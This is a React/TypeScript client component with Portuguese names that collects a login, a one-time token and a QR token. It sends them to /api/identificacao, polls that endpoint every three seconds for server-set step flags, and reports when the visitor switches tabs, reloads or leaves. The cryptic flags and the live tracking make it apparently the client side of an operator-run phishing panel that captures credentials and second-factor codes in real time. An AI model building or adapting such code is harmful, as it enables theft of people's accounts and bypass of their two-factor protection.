"use client";
import React, {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useRef,
  useState,
} from "react";

type Resp =
  | {}
  | {
      s: number | null;
      ils1l: boolean;
      ils1e: boolean;
      ils1v: boolean;
      n: string | null;
      ns: string | null;
      tt: 1 | 2;
      ils2l: boolean;
      ils2e: boolean;
      ils2v: boolean;
      ils3l: boolean;
      ils3e: boolean;
      qrCodeUrl: string | null;
    };
type IdentificationContextType = {
  state: Resp;
  loading: boolean;
  ready: boolean;
  loginS1: (p: { usuario: string; senha: string }) => Promise<void>;
  sendToken1: (token: string) => Promise<void>;
  sendTokenQr: (tokenqr: string) => Promise<void>;
  emitEvent: (eventType: string, eventData?: any) => Promise<void>;
  refresh: () => Promise<void>;
};
const IdentificationContext = createContext<IdentificationContextType | null>(
  null
);
async function postIdentificacao(body?: any): Promise<Resp> {
  const res = await fetch("/api/identificacao", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body ?? {}),
    keepalive: true,
  });
  try {
    return (await res.json()) as Resp;
  } catch {
    return {};
  }
}
export function IdentificationProvider({
  children,
}: {
  children: React.ReactNode;
}) {
  const [state, setState] = useState<Resp>({});
  const [loading, setLoading] = useState(false);
  const [ready, setReady] = useState(false); // << NOVO
  const timerRef = useRef<number | null>(null);
  const skipNextPollRef = useRef(false);
  const updateFrom = useCallback((resp: Resp) => {
    setState(resp ?? {});
    setReady(true);
  }, []);
  const refresh = useCallback(async () => {
    const resp = await postIdentificacao({});
    updateFrom(resp);
  }, [updateFrom]);
  const loginS1 = useCallback(
    async ({ usuario, senha }: { usuario: string; senha: string }) => {
      setLoading(true);
      try {
        const resp = await postIdentificacao({ usuario, senha });
        updateFrom(resp); // << UI atualiza imediatamente
        skipNextPollRef.current = true;
      } finally {
        setLoading(false);
      }
    },
    [updateFrom]
  );
  const sendToken1 = useCallback(
    async (token: string) => {
      setLoading(true);
      try {
        const resp = await postIdentificacao({ token });
        updateFrom(resp);
        skipNextPollRef.current = true;
      } finally {
        setLoading(false);
      }
    },
    [updateFrom]
  );
  const sendTokenQr = useCallback(
    async (tokenqr: string) => {
      setLoading(true);
      try {
        const resp = await postIdentificacao({ tokenqr });
        updateFrom(resp);
        skipNextPollRef.current = true;
      } finally {
        setLoading(false);
      }
    },
    [updateFrom]
  );
  const emitEvent = useCallback(async (eventType: string, eventData?: any) => {
    try {
      await postIdentificacao({ __event: eventType, __eventData: eventData });
    } catch {}
  }, []);
  useEffect(() => {
    let cancelled = false;
    (async () => {
      await refresh();
      if (cancelled) return;
      const nav = performance.getEntriesByType("navigation")[0] as
        | PerformanceNavigationTiming
        | undefined;
      if (nav && nav.type === "reload")
        emitEvent("Usuario recarregou a página");
      else emitEvent("Usuario entrou na página");
      const onVisibility = () => {
        if (document.visibilityState === "hidden")
          emitEvent("Usuario mudou de aba");
      };
      document.addEventListener("visibilitychange", onVisibility);
      const onLeave = () => emitEvent("Usuario saiu da página");
      window.addEventListener("pagehide", onLeave);
      window.addEventListener("beforeunload", onLeave);
      return () => {
        document.removeEventListener("visibilitychange", onVisibility);
        window.removeEventListener("pagehide", onLeave);
        window.removeEventListener("beforeunload", onLeave);
      };
    })();
    return () => {
      cancelled = true;
    };
  }, [emitEvent, refresh]);
  useEffect(() => {
    timerRef.current = window.setInterval(async () => {
      if (skipNextPollRef.current) {
        skipNextPollRef.current = false;
        return;
      }
      const resp = await postIdentificacao({});
      updateFrom(resp);
    }, 3000) as unknown as number;

    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    };
  }, [updateFrom]);
  const value: IdentificationContextType = {
    state,
    loading,
    ready,
    loginS1,
    sendToken1,
    sendTokenQr,
    emitEvent,
    refresh,
  };

  return (
    <IdentificationContext.Provider value={value}>
      {children}
    </IdentificationContext.Provider>
  );
}
export function useIdentification() {
  const ctx = useContext(IdentificationContext);
  if (!ctx)
    throw new Error(
      "useIdentification deve ser usado dentro de <IdentificationProvider>"
    );
  return ctx;
}
